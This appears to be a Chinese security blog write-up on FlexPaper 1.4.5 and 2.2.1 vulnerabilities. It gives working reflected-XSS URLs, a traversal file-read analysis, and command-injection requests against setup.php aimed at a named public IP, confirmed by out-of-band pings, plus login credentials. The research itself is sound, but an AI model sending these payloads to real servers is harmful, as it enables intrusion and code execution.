+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.104.186/FlexPaper_1.4.5_flash/php/split_document.php?doc=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/8bbdd5814ea1eff9.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	function validPdfParams($path,$doc,$page)&#123;</span><br><span class="line">		return !(	basename(realpath($path)) != $doc ||</span><br><span class="line">				 	substr_compare($doc, &#x27;pdf&#x27;, -3, 3) === -1 ||</span><br><span class="line">				 	strlen($doc) &gt; 255 ||</span><br><span class="line">				 	strlen($page) &gt; 255</span><br><span class="line">				);	</span><br><span class="line">	&#125;</span><br><span class="line">validPdfParams($pdfFilePath,$doc,$page);</span><br></pre></td></tr></table></figure>
+
+<p>详细看一下<code>FlexPaper1.4.5</code></p>
+<p>先分析<code>simple_document.php</code>文件</p>
+<p>先是实例化了一个对象<code>$configManager</code>，这里构造函数如果是win系统，那么类属性$config是<code>lib/config.ini.win.php</code>，否则是<code>lib/config.ini.nix.php</code></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/bcb168e44549dfd6.png"></p>
+<p>这里如果本地是win系统，那么内容如下</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCSSOVs"><img src="https://s1.ax1x.com/2023/06/02/pCSSOVs.png" alt="pCSSOVs.png"></a></p>
+<p>而我们攻击的对象刚好是linux</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCSpCMF"><img src="https://s1.ax1x.com/2023/06/02/pCSpCMF.png" alt="pCSpCMF.png"></a></p>
+<p><code>$pdfFilePath = $configManager-&gt;getConfig(&#39;path.pdf&#39;) . $doc;</code>，这里调用实例化对象下的getConfig方法</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/d81dc9ab8b5af4e0.png"></p>
+<p>这里传入令key = path.pdf，然后判断config下的path.pdf是否存在，如果存在就返回这个存在的内容，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/flexpaper/php/pdf/</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCSFDPA"><img src="https://s1.ax1x.com/2023/06/02/pCSFDPA.png" alt="pCSFDPA.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCSkwLT"><img src="https://s1.ax1x.com/2023/06/02/pCSkwLT.png" alt="pCSkwLT.png"></a></p>
+<p>即</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pdfFilePath</span> = <span class="string">&quot;/var/www/flexpaper/php/pdf/&quot;</span>. <span class="variable">$doc</span>;</span><br><span class="line"><span class="variable">$swfFilePath</span> = <span class="string">&quot;/var/www/flexpaper/php/docs/&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里的判断看$swfFilePath的目录是否存在，且调用了validPdfParams函数，</p>
+<p><img src="https://s1.ax1x.com/2023/06/02/pCSkRQx.png" alt="pCSkRQx.png"></p>
+<p>这里由于路径都不存在，所以返回false</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validPdfParams</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$doc</span>,<span class="variable">$page</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(	<span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">realpath</span>(<span class="variable">$path</span>)) != <span class="variable">$doc</span> ||</span><br><span class="line">			 	<span class="title function_ invoke__">substr_compare</span>(<span class="variable">$doc</span>, <span class="string">&#x27;pdf&#x27;</span>, -<span class="number">3</span>, <span class="number">3</span>) === -<span class="number">1</span> ||</span><br><span class="line">			 	<span class="title function_ invoke__">strlen</span>(<span class="variable">$doc</span>) &gt; <span class="number">255</span> ||</span><br><span class="line">			 	<span class="title function_ invoke__">strlen</span>(<span class="variable">$page</span>) &gt; <span class="number">255</span></span><br><span class="line">			);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于上面那里不能成立，所以到这里输出</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCSACfs"><img src="https://s1.ax1x.com/2023/06/02/pCSACfs.png" alt="pCSACfs.png"></a></p>
+<p>在services/view.php里面</p>
+<p>以上的情况是由于对应的文件不存在，如果文件存在会造成什么漏洞呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$doc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;doc&quot;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&quot;page&quot;</span>];</span><br><span class="line"><span class="variable">$pdfFilePath</span> = <span class="string">&#x27;C:\inetpub\wwwroot\flexpaper\php\pdf\&#x27;.$doc;</span></span><br><span class="line"><span class="string">$swfFilePath = &#x27;</span>C:\inetpub\wwwroot\flexpaper\php\pdf\<span class="string">&#x27; . $doc  . $page. &quot;.swf&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">尝试帮我构造请求，给我doc和page需要传入的内容，从而通过这两行代码实现读取C:\Windows\win.ini，由此，就必须要绕过最后的.swf结尾限制</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$doc=&quot;1&quot;;</span><br><span class="line">$page=&quot;2&quot;;</span><br><span class="line">$pdfFilePath = &#x27;C:\inetpub\wwwroot\flexpaper\php\pdf\\&#x27;.$doc;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$swfFilePath = &#x27;C:\inetpub\wwwroot\flexpaper\php\pdf\\&#x27; . $doc  . $page. &quot;.swf&quot;;</span><br><span class="line">echo file_get_contents($swfFilePath);</span><br><span class="line"></span><br><span class="line">// C:\inetpub\wwwroot\flexpaper\php\pdf\ . $doc  . $page. &quot;.swf&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$swfFilePath</span> = <span class="string">&#x27;C:\inetpub\wwwroot\flexpaper\php\pdf\\12.swf&quot;;</span></span><br><span class="line"><span class="string">echo file_get_contents($swfFilePath);</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><p>这里我们的$doc和$page是可控段，下面的<code>$output=$pdfconv-&gt;convert($doc,$page);</code>跟进</p>
+<p><img src="https://pic5.58cdn.com.cn/nowater/webim/big/n_v2c760899cb641454c9796f8786a4196f5.png" alt="image.png"></p>
+<p>这里exec是命令执行$command，这个参数我们不可控，除非我们能修改php文件内容，当exec命令执行成功后，$return_var就是0，执行失败就是1，如果是0，回到上图，那么最后就会执行文件读取</p>
+<p><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v2c57ea1b4b91944f98d7927fcf5de3962.png" alt="image.png"></p>
+<p>但是问题是：$doc和$page是可控的，且可跨目录，但是可读取的文件后缀就被.swf限制死了，而且swf文件读起来对渗透也没渗透用…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$swfFilePath</span> = <span class="string">&#x27;C:\inetpub\wwwroot\flexpaper\php\pdf\\&#x27;</span> . <span class="variable">$doc</span>  . <span class="variable">$page</span>. <span class="string">&quot;.swf&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$swfFilePath</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="FlexPaper2-2-1"><a href="#FlexPaper2-2-1" class="headerlink" title="FlexPaper2.2.1"></a>FlexPaper2.2.1</h4><h5 id="反射XSS"><a href="#反射XSS" class="headerlink" title="反射XSS"></a>反射XSS</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//118.190.104.186/FlexPaper_2.2.1/demo.php?name=&lt;/script&gt;&#x27;&#125;&#125;)&lt;script&gt;alert(1)&lt;/script&gt;(&#123;&#123;&#x27;&lt;script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic5.58cdn.com.cn/nowater/webim/big/n_v2a9754c1b2d064e0a857d982b33e4dfde.png" alt="}W2DIFA88GPP0B)OH%0_QF3.png"><br><img src="https://pic5.58cdn.com.cn/nowater/webim/big/n_v28f8fa88c9c60496e8ae91d1205efbff3.png" alt="D25HU8NTNNNFE%R_FH585OW.png"><br><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v2111510981e364dfda51951f8d4a3d765.png" alt="V@8ZH.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path_to_pdf2swf</span> 	= <span class="string">&#x27;C:\Program Files\SWFTools\\&#x27;</span>;</span><br><span class="line"><span class="variable">$path_to_pdf2json</span> 	= <span class="string">&#x27;C:\Program Files\PDF2JSON\\&#x27;</span>;</span><br><span class="line"><span class="variable">$pdf2swf_exec</span> 		= <span class="string">&#x27;pdf2swf.exe&#x27;</span>;</span><br><span class="line"><span class="variable">$pdf2json_exec</span> 		= <span class="string">&#x27;pdf2json.exe&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">pdf2swfEnabled</span>(<span class="string">&#x27;C:\Program Files\SWFTools\pdf2swf.exe&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$path_to_pdf2swf</span> 	= <span class="string">&#x27;C:\Program Files (x86)\SWFTools\\&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path_to_pdf2swf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;PDF2SWF_PATH&#x27;</span>];</span><br><span class="line"><span class="variable">$pdf2swf_exec</span> = pdf2swf.exe    </span><br><span class="line">		    <span class="variable">$pdf2swf</span> 	= <span class="title function_ invoke__">pdf2swfEnabled</span>(<span class="variable">$path_to_pdf2swf</span> . <span class="variable">$pdf2swf_exec</span>);</span><br><span class="line">		    <span class="variable">$pdf2json</span> 	= <span class="title function_ invoke__">pdf2jsonEnabled</span>(<span class="variable">$path_to_pdf2json</span> . <span class="variable">$pdf2json_exec</span>);  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir%CommonProgramFiles:~10,1%flag</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="无回显命令执行-2"><a href="#无回显命令执行-2" class="headerlink" title="无回显命令执行 * 2"></a>无回显命令执行 * 2</h5><p>在<code>FlexPaper_2.2.1/php/setup.php</code>内部有一个<code>pdf2swfEnabled</code>方法</p>
+<p><img src="https://pic7.58cdn.com.cn/nowater/webim/big/n_v2f551c85bee574bbfa5b8e3e4073d8b9f.png" alt="image.png"></p>
+<p>如果这个参数可控，那么我们就可以实现rce，在328行，是通过<code>$path_to_pdf2swf . $pdf2swf_exec</code>拼接传入</p>
+<p><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v235cd3b96bbab470fb13acb62c5765125.png" alt="image.png"></p>
+<p>我们将重要部分代码提取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdf2swfEnabled</span>(<span class="params"><span class="variable">$path_to_pdf2swf</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>) &amp;&amp; (DIRECTORY_SEPARATOR == <span class="string">&#x27;/&#x27;</span> || (DIRECTORY_SEPARATOR == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; <span class="variable">$path_to_pdf2swf</span> != <span class="string">&#x27;pdf2swf&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span>(	PHP_OS == <span class="string">&quot;WIN32&quot;</span> || PHP_OS == <span class="string">&quot;WINNT&quot;</span>	)&#123;</span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$path_to_pdf2swf</span> . <span class="string">&#x27;&quot;&#x27;</span> . <span class="string">&#x27; --version 2&gt;&amp;1&#x27;</span>, <span class="variable">$out</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="variable">$path_to_pdf2swf</span> . <span class="string">&#x27; --version 2&gt;&amp;1&#x27;</span>, <span class="variable">$out</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$out</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$out</span>[<span class="number">0</span>], <span class="string">&#x27;swftools&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$ex</span>) &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$path_to_pdf2swf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;PDF2SWF_PATH&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$path_to_pdf2swf</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$pdf2swf_exec</span> 		= <span class="string">&#x27;pdf2swf.exe&#x27;</span>;  <span class="comment">// 如果是linux则是$pdf2swf_exec 		= &#x27;pdf2swf&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$path_to_pdf2swf</span> . <span class="variable">$pdf2swf_exec</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$pdf2swf</span> 	= <span class="title function_ invoke__">pdf2swfEnabled</span>(<span class="variable">$path_to_pdf2swf</span> . <span class="variable">$pdf2swf_exec</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$path_to_pdf2swf</span>. <span class="variable">$pdf2swf_exec</span>. <span class="string">&#x27;&quot;&#x27;</span> .<span class="string">&#x27; --version 2&gt;&amp;1&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/webshell.php?PDF2SWF_PATH=notepad&quot;%26&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.58cdn.com.cn/nowater/webim/big/n_v288682423ed474b0e862ae27b725d8442.png" alt="image.png"></p>
+<p>但是如果采用以上的写法的话，相当于在cmd下执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;calc&quot;</span>&amp;<span class="string">&quot;pdf2swf.exe&quot;</span> --version <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">calc这里命令就单一了，不能为<span class="string">&quot;net user&quot;</span>&amp;<span class="string">&quot;pdf2swf.exe&quot;</span> --version <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.58cdn.com.cn/nowater/webim/big/n_v22824a1e39d064d6db0294726de5bfeb9.png" alt="image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们为了验证无回显rce是否被成功之后传入<span class="string">&quot;&quot;</span>type <span class="number">123456</span>&gt;batman0728.txt&amp;<span class="string">&quot;pdf2swf.exe&quot;</span> --version <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>传入</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/webshell.php?PDF2SWF_PATH=&quot;type 123456&gt;batman0728.txt%26&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic3.58cdn.com.cn/nowater/webim/big/n_v2fe5d5b53be9640f1a1974e9e9e6fc976.png" alt="image.png"><br><img src="https://pic3.58cdn.com.cn/nowater/webim/big/n_v227325ad97a224c30bd5a1ecb8848453e.png" alt="image.png"><br><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v2c380234bc1d64ee990bdfc0262c16d64.png" alt="image.png"></p>
+<p>以此验证rce是否成功，在linux下也是一样的，命令稍有不同，linux下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdf2swfEnabled</span>(<span class="params"><span class="variable">$path_to_pdf2swf</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>) &amp;&amp; (DIRECTORY_SEPARATOR == <span class="string">&#x27;/&#x27;</span> || (DIRECTORY_SEPARATOR == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; <span class="variable">$path_to_pdf2swf</span> != <span class="string">&#x27;pdf2swf&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span>(	PHP_OS == <span class="string">&quot;WIN32&quot;</span> || PHP_OS == <span class="string">&quot;WINNT&quot;</span>	)&#123;</span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="variable">$path_to_pdf2swf</span> . <span class="string">&#x27; --version 2&gt;&amp;1&#x27;</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="comment">//                exec(&#x27;&quot;&#x27; . $path_to_pdf2swf . &#x27;&quot;&#x27; . &#x27; --version 2&gt;&amp;1&#x27;, $out);</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//                exec($path_to_pdf2swf . &#x27; --version 2&gt;&amp;1&#x27;, $out);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$out</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$out</span>[<span class="number">0</span>], <span class="string">&#x27;swftools&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$ex</span>) &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$path_to_pdf2swf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;PDF2SWF_PATH&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$path_to_pdf2swf</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$pdf2swf_exec</span> 		= <span class="string">&#x27;pdf2swf&#x27;</span>;  <span class="comment">// 如果是linux则是$pdf2swf_exec 		= &#x27;pdf2swf&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$path_to_pdf2swf</span> . <span class="variable">$pdf2swf_exec</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$pdf2swf</span> 	= <span class="title function_ invoke__">pdf2swfEnabled</span>(<span class="variable">$path_to_pdf2swf</span> . <span class="variable">$pdf2swf_exec</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$path_to_pdf2swf</span>. <span class="variable">$pdf2swf_exec</span>. <span class="string">&#x27;&quot;&#x27;</span> .<span class="string">&#x27; --version 2&gt;&amp;1&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>linux下是<code>exec($path_to_pdf2swf . &#39; --version 2&gt;&amp;1&#39;, $out);</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?PDF2SWF_PATH=echo 123456&gt;batman0728.txt&amp;pdf2swf --version 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>这里是当case=2时触发，也就是当传入的step=2时，$IFS$9是命令分隔符</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.104.186/FlexPaper_2.2.1/php/setup.php?step=2&amp;PDF2SWF_PATH=ping$IFS$9hw9kzs.dnslog.cn%26</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.58cdn.com.cn/nowater/webim/big/n_v2a9060e5dbf054b22aafdd7490be758be.png" alt="image.png"><br><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v220315508ca824a45a761e14db048094d.png" alt="image.png"></p>
+<p>如下</p>
+<p><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v200cecc390cc64591a7bd57eb77f6c36a.png" alt="image.png"></p>
+<p>这里我们是调用了pdf2swfEnabled方法，下面的pdf2jsonEnabled方法也是一样的，<code>path_to_pdf2json</code>也是可控的</p>
+<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/145914/28/39148/39212/647acac1F6279c7d5/404b26b57e9fde9b.jpg" alt="image.png"><br><img src="https://img14.360buyimg.com/ddimg/jfs/t1/217765/12/28352/37606/647acaf6Fbb3cefaa/e584b92d46421a23.jpg" alt="image.png"></p>
+<p>构造请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping fl8nw3.ceye.io</span><br><span class="line">http://118.190.104.186/FlexPaper_2.2.1/php/setup.php?step=2&amp;PDF2JSON_PATH=ping$IFS$9fl8nw3.ceye.io%26</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/144489/37/34067/38918/647acbe0Fc64cd707/66c73a3072873c96.jpg" alt="image.png"><br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/129689/30/37251/75470/647acbecFfe1c55ff/d7ffe5b811a14fbb.jpg" alt="image.png"></p>
+<h6 id="无法绕过的反射XSS"><a href="#无法绕过的反射XSS" class="headerlink" title="无法绕过的反射XSS"></a>无法绕过的反射XSS</h6><p>下面这里用htmlspecialchars函数过滤了，我们平时说的绕过htmlspecialchars是在你输出的内容在一个类似input标签里，利用单引号闭合之后再利用事件执行js，但是我这里没有标签包裹，所以无法绕过</p>
+<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/141824/40/32422/78846/647acec4F61679cf1/2327b0f864241237.jpg" alt="image.png"></p>
+<h4 id="反射XSS-需要登陆"><a href="#反射XSS-需要登陆" class="headerlink" title="反射XSS-需要登陆"></a>反射XSS-需要登陆</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">batmanfuture</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p>登陆后访问</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.104.186/testRancher.php?currentClassId=&lt;script&gt;alert(1)&lt;/script&gt;&amp;eid=&lt;script&gt;alert(2)&lt;/script&gt;&amp;solId=&lt;script&gt;alert(3)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/214197/40/30956/88769/647ad4bfF1dcb409a/d283209eb4432351.jpg" alt="image.png"><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/46930/28/22117/57334/647ad4c5F08f0038e/7589aefa980533a3.jpg" alt="image.png"></p>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/221607/36/28987/59351/647ad4d1F2f2f5a2b/ddf366d3c49d8168.jpg" alt="image.png"></p>
+<p>代码如下</p>
+<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/128012/20/37968/27665/647ad50fFe2d89aa8/2bdb1b6471e22519.jpg" alt="image.png"></p>
+<h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p><a target="_blank" rel="noopener" href="http://118.190.104.186/testSvn.php%EF%BC%8C%E6%B3%84%E9%9C%B2%E4%BA%86Subversion">http://118.190.104.186/testSvn.php，泄露了Subversion</a> 代码库账户密码</p>
+<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/121164/9/25546/31112/647ad759F9422d5d3/86eadd8f10946f76.jpg" alt="image.png"></p>
